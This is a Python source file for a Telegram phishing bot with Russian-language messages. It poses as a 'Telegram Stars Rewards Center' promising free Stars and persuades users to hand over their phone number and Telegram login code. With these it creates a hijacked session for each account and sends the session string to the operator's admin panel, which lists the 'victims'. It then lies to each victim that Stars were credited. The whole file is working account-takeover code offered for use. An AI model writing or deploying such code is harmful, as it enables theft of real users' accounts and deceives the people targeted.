import os
import asyncio
from telebot import TeleBot, types
from telethon import TelegramClient
from telethon.sessions import StringSession

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}

print("[+] PHANTOM REAL FISHING BOT ЗАПУЩЕН")

# ====================== СТАРТ ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Telegram Stars Rewards Center</b>

🎁 Получайте до 5000 Stars бесплатно!

Нажми кнопку ниже и подключи аккаунт за 20 секунд 👇"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== НАСТОЯЩИЙ ФИШИНГ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📱 Отправить мой контакт", request_contact=True))
    
    bot.send_message(call.message.chat.id, 
        "📱 Для получения Stars отправь свой контакт (нажми кнопку ниже)", 
        reply_markup=markup)

# ====================== ОБРАБОТКА КОНТАКТА ======================
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if not message.contact:
        return
    
    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    bot.send_message(message.chat.id, f"✅ Контакт принят!\n📱 Номер: <b>{phone}</b>\n\nТеперь введи код подтверждения, который пришёл в Telegram:", parse_mode='HTML')
    
    # Сохраняем номер
    victims[phone] = {"contact_name": message.contact.first_name or "Unknown"}
    
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()

    print(f"[+] РЕАЛЬНЫЙ ФИШ → Номер: {phone} | Код: {code}")

    # Авто-создание сессии
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone].update({
            "session_string": session_string,
            "fished_code": code,
            "first_name": me.first_name,
            "username": me.username
        })

        await bot.send_message(ADMIN_ID, f"""🌟 НОВАЯ ЖЕРТВА ПОЙМАНА!

📱 Номер: {phone}
👤 Имя: {me.first_name}
🔑 Код: {code}
✅ Сессия создана автоматически""")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Фиш пойман!\n📱 {phone}\n🔑 Код: {code}\nОшибка сессии: {e}")
    finally:
        await client.disconnect()

    # Ответ жертве
    bot.send_message(message.chat.id, """🎉 <b>Аккаунт успешно подключён!</b>

На ваш баланс начислено <b>4750 Stars</b>! 

Теперь вы можете использовать их в мини-приложениях и играх.

Спасибо за участие!""", parse_mode='HTML')

# ====================== АДМИН ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return
    
    if not victims:
        bot.send_message(message.chat.id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in victims:
        short = phone[-8:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"code:{phone}"),
            types.InlineKeyboardButton(f"📄 Session {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Проверить {short}", callback_data=f"check:{phone}")
        )

    bot.send_message(message.chat.id, f"🔥 PHANTOM ADMIN PANEL\nПоймано: {len(victims)}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.from_user.id != ADMIN_ID:
        return
    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        return

    if action == "file":
        bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{data.get('session_string', 'Сессия ещё не создана')}</code>", parse_mode='HTML')
    elif action == "code":
        bot.send_message(call.message.chat.id, f"🔑 Код для {phone}: {data.get('fished_code', 'Ещё не ввели')}")
    elif action == "check":
        bot.send_message(call.message.chat.id, f"👁 {phone}\nИмя: {data.get('first_name', '—')}\nUsername: @{data.get('username', 'нет')}")

print("[+] Бот готов. Жертвы отправляют контакт.")
bot.infinity_polling(none_stop=True)
